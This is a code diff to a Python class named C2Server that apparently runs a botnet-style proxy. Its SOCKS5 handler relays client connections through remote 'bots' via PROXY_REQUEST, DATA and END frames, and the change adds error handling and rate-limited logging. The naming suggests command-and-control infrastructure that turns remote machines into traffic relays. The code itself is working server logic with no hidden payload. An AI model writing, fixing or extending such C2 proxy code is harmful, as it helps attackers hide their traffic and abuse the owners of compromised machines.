@@ -327,48 +327,75 @@ class C2Server:
         bot = self._next_bot()
         if not bot:
             writer.close(); return
-        data = await reader.readexactly(2)
-        nmethods = data[1]
-        await reader.readexactly(nmethods)  # methods
-        writer.write(b"\x05\x00"); await writer.drain()
-        req = await reader.readexactly(4)
-        if req[1] != 1:  # not CONNECT
-            writer.close(); return
-        atyp = req[3]
-        if atyp == 1:  # IPv4
-            host = ".".join(map(str, (await reader.readexactly(4))))
-        elif atyp == 3:  # domain
-            ln = (await reader.readexactly(1))[0]
-            host = (await reader.readexactly(ln)).decode()
-        else:
-            writer.close(); return
-        port = int.from_bytes(await reader.readexactly(2), "big")
-        writer.write(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00"); await writer.drain()
-        req_id = str(uuid.uuid4())
-        bot.active[req_id] = {"writer": writer, "host": host, "port": port, "client": peer}
-        await bot.stream.send(Frame(type="PROXY_REQUEST", request_id=req_id, meta={"host": host, "port": port}))
-
-        async def pump_client():
-            try:
-                while True:
-                    chunk = await reader.read(4096)
-                    if not chunk:
-                        break
-                    try:
-                        await bot.stream.send(Frame(type="DATA", request_id=req_id, payload=chunk))
-                    except (ConnectionResetError, ConnectionAbortedError, OSError, BrokenPipeError) as e:
-                        # Bot connection lost, stop pumping
-                        error_type = f"socks_send_{type(e).__name__}"
-                        if self._should_log_error(error_type, max_per_minute=3):
-                            logger.debug("socks send error: %s", e)
-                        break
-            finally:
+        
+        try:
+            # SOCKS5 handshake
+            data = await reader.readexactly(2)
+            nmethods = data[1]
+            await reader.readexactly(nmethods)  # methods
+            writer.write(b"\x05\x00"); await writer.drain()
+            
+            # SOCKS5 request
+            req = await reader.readexactly(4)
+            if req[1] != 1:  # not CONNECT
+                writer.close(); return
+            atyp = req[3]
+            if atyp == 1:  # IPv4
+                host = ".".join(map(str, (await reader.readexactly(4))))
+            elif atyp == 3:  # domain
+                ln = (await reader.readexactly(1))[0]
+                host = (await reader.readexactly(ln)).decode()
+            else:
+                writer.close(); return
+            port = int.from_bytes(await reader.readexactly(2), "big")
+            writer.write(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00"); await writer.drain()
+            
+            # Setup proxy connection
+            req_id = str(uuid.uuid4())
+            bot.active[req_id] = {"writer": writer, "host": host, "port": port, "client": peer}
+            await bot.stream.send(Frame(type="PROXY_REQUEST", request_id=req_id, meta={"host": host, "port": port}))
+            
+            # Start data pumping
+            async def pump_client():
                 try:
-                    await bot.stream.send(Frame(type="END", request_id=req_id))
-                except Exception:
-                    pass
+                    while True:
+                        chunk = await reader.read(4096)
+                        if not chunk:
+                            break
+                        try:
+                            await bot.stream.send(Frame(type="DATA", request_id=req_id, payload=chunk))
+                        except (ConnectionResetError, ConnectionAbortedError, OSError, BrokenPipeError) as e:
+                            # Bot connection lost, stop pumping
+                            error_type = f"socks_send_{type(e).__name__}"
+                            if self._should_log_error(error_type, max_per_minute=3):
+                                logger.debug("socks send error: %s", e)
+                            break
+                finally:
+                    try:
+                        await bot.stream.send(Frame(type="END", request_id=req_id))
+                    except Exception:
+                        pass
 
-        asyncio.create_task(pump_client(), name=f"pump-socks-{req_id}")
+            asyncio.create_task(pump_client(), name=f"pump-socks-{req_id}")
+            
+        except (asyncio.IncompleteReadError, ConnectionResetError, ConnectionAbortedError, OSError) as e:
+            # Client disconnected during handshake - this is normal
+            error_type = f"socks_handshake_{type(e).__name__}"
+            if self._should_log_error(error_type, max_per_minute=3):
+                logger.debug("SOCKS handshake error from %s: %s", peer, e)
+            try:
+                writer.close()
+            except Exception:
+                pass
+            return
+        except Exception as e:
+            # Other unexpected errors
+            logger.warning("SOCKS handler error from %s: %s", peer, e)
+            try:
+                writer.close()
+            except Exception:
+                pass
+            return
 
     async def _handle_api_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
         peer = writer.get_extra_info("peername")
